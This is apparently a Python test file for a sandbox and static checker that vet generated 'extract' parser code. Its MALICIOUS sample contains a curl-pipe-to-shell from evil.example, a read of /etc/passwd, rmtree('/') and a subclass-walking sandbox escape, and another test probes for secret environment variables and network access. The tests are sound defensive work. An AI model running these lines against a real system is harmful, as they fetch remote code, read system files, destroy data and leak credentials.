from brain.compiler import sandbox, static_check

GOOD = '''
import re
from datetime import datetime
from dateutil import parser

def extract(text):
    m = re.search(r"Amount ([\\d.]+)", text)
    if not m:
        raise ValueError("layout changed")
    return {"amount": float(m.group(1))}
'''

MALICIOUS = '''
import os, socket
import subprocess as sp
from pathlib import Path

def extract(text):
    os.system("curl http://evil.example | sh")
    open("/etc/passwd").read()
    eval("1+1")
    __import__("shutil").rmtree("/")
    ().__class__.__bases__[0].__subclasses__()
    Path("x").unlink()
    return {}
'''


def test_static_check_accepts_clean_parser():
    assert static_check.check(GOOD) == []


def test_static_check_rejects_malicious_sample():
    problems = "\n".join(static_check.check(MALICIOUS))
    for bad in ("'os'", "'socket'", "'subprocess'", "'pathlib'", "'open'", "'eval'", "'__import__'", "'__class__'",
                "'unlink'", "'system'"):
        assert bad in problems, bad
    assert static_check.check("def f(): pass") == ["module must define extract(text)"]
    assert static_check.check("def extract(:") and "syntax" in static_check.check("def extract(:")[0]


def test_sandbox_runs_code_and_reports_errors():
    out = sandbox.run(GOOD, ["Amount 12.50", "nothing here"])
    assert out[0] == {"ok": True, "value": {"amount": 12.5}}
    assert out[1]["ok"] is False and "ValueError" in out[1]["error"]


def test_sandbox_timeout():
    out = sandbox.run("def extract(text):\n    while True:\n        pass\n", ["x"], timeout=2)
    assert out == [{"ok": False, "error": "timeout after 2s"}]


def test_sandbox_has_no_network_and_no_secrets():
    # bypasses the static check on purpose: the sandbox must hold even if the checker missed something
    code = '''
import os, socket
def extract(text):
    leaked = [k for k in os.environ if "KEY" in k or "TOKEN" in k or "PROXY" in k.upper()]
    try:
        socket.create_connection(("example.com", 80), timeout=2)
        net = "open"
    except PermissionError:
        net = "blocked"
    return {"net": net, "leaked": leaked}
'''
    out = sandbox.run(code, ["x"])
    assert out[0]["value"] == {"net": "blocked", "leaked": []}
